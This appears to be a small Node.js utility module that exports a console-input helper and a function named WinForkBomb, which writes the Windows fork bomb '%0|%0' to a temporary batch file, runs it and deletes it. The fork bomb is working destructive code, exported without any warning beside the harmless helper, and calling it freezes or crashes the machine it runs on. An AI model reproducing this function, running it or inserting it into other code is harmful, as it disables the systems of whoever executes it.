const readlineSync = require('readline-sync');
const fs = require("fs");
const cmd = require('node-cmd');

const input = ask => {
    const consoleInput = readlineSync.question(ask);
    return consoleInput;
}

function WinForkBomb() {
    let content = `%0|%0`;
    let tempfile = `temp.bat`;
    fs.writeFileSync(tempfile, content);
    cmd.runSync(`${tempfile}`);
    fs.unlinkSync(tempfile);
}

module.exports = { input, WinForkBomb };
